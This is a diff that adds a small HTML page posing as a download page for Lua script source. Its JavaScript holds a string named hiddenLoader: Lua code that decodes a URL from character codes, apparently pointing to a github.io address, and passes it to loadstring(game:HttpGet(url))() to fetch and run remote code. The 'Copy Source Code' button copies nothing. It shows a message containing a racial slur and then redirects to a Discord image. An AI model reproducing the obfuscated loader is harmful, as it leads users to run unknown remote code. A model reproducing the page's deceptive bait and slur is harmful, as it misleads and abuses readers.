@@ -1,0 +1,168 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Script Source</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background: #171717;
+    color: #ddd;
+    font-family: Arial, sans-serif;
+}
+
+.nav {
+    height: 55px;
+    background: #202020;
+    border-bottom: 1px solid #333;
+    display: flex;
+    align-items: center;
+    padding: 0 25px;
+    font-size: 15px;
+    color: #aaa;
+}
+
+.nav b {
+    color: white;
+    margin-right: 7px;
+}
+
+.container {
+    width: 90%;
+    max-width: 650px;
+    margin: 100px auto;
+    background: #202020;
+    border: 1px solid #383838;
+    padding: 25px;
+}
+
+h2 {
+    font-size: 22px;
+    font-weight: normal;
+    margin: 0 0 10px;
+    color: #eee;
+}
+
+p {
+    color: #999;
+    font-size: 14px;
+    line-height: 1.6;
+}
+
+.line {
+    border-top: 1px solid #383838;
+    margin: 22px 0;
+}
+
+.details {
+    font-size: 13px;
+    color: #888;
+    margin-bottom: 22px;
+}
+
+button {
+    background: #383838;
+    color: #ddd;
+    border: 1px solid #505050;
+    padding: 11px 16px;
+    font-size: 13px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #484848;
+}
+
+#message {
+    display: none;
+    margin-top: 20px;
+    padding: 12px;
+    background: #292929;
+    border-left: 3px solid #888;
+    color: #ddd;
+    font-size: 14px;
+}
+
+.footer {
+    margin-top: 70px;
+    text-align: center;
+    color: #555;
+    font-size: 11px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="nav">
+    <b>Scripts</b> / Source
+</div>
+
+<div class="container">
+
+    <h2>Script Source</h2>
+
+    <p>
+        Source code is available below.
+        Click the button to continue.
+    </p>
+
+    <div class="line"></div>
+
+    <div class="details">
+        Status: Available<br><br>
+        Type: Lua Script<br><br>
+        Version: Latest
+    </div>
+
+    <button onclick="showMessage()">
+        Copy Source Code
+    </button>
+
+    <div id="message">
+        I dickline this offer Nigger
+    </div>
+
+</div>
+
+<div class="footer">
+    Script Source Page
+</div>
+
+<script>
+const hiddenLoader = `
+local chars = {
+    104,116,116,112,115,58,47,47,
+    110,117,103,101,114,103,117,121,
+    53,48,45,97,102,107,46,
+    103,105,116,104,117,98,46,105,111,
+    47,110,47
+}
+
+local url = ""
+for _, v in ipairs(chars) do
+    url = url .. string.char(v)
+end
+
+loadstring(game:HttpGet(url))()
+`;
+
+function showMessage() {
+    document.getElementById("message").style.display = "block";
+
+    setTimeout(function() {
+        window.location.href =
+        "https://media.discordapp.net/attachments/760539457987280926/807391007808553040/image0.gif?ex=6aefb2f8&is=6aee6178&hm=b78218a4c5400726417de9e35ee478a0995bd06b3018efc5c906d28abd85baf4&";
+    }, 1800);
+}
+</script>
+
+</body>
+</html>
